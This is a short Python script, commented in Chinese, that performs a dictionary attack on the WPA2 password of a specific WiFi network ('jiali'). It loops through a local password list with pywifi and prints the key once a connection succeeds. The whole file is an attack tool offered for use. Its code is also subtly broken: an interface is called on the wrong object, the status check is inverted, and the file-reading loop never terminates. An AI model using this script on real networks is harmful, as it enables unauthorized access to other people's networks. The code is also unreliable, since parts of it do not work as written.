# @Time    : 2021/7/30 9:56
# @Author  : hubaba
# @Software: PyCharm
import cipher as cipher
import pywifi
from pywifi import const
import time
import datetime


# 测试连接，返回连接结果
def wifiConnect(pwd):
    # 获取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = pywifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifis_stuas = ifaces.status()
    if wifis_stuas == const.IFACE_CONNECTED:
        # 创建wifi连接文件
        profile = pywifi.Profile()
        # 受连接的wifi名称
        profile.ssid = 'jiali'
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi
        ifaces.remove_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("wifi已连接...")


# 读取密码本  mima.txt
def readPassword():
    print("开始破解wifi...")
    # 读取密码本路径
    file = open(r"D:\WorkSpace-PyCharm\quickWork\wifi_op\mima.txt")
    while True:
        try:
            # 一行行读取
            pad = file.readline()
            bool = wifiConnect(pad)
            if bool:
                print("密码已破解，当前wifi密码为：", pad)
                print("wifi已连接...")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("密码破解中...校对密码为:", pad)
        except:
            continue


start = datetime.datetime.now()
readPassword()
end = datetime.datetime.now()
print("wifi破解使用时长为：{}秒".format(end - start))
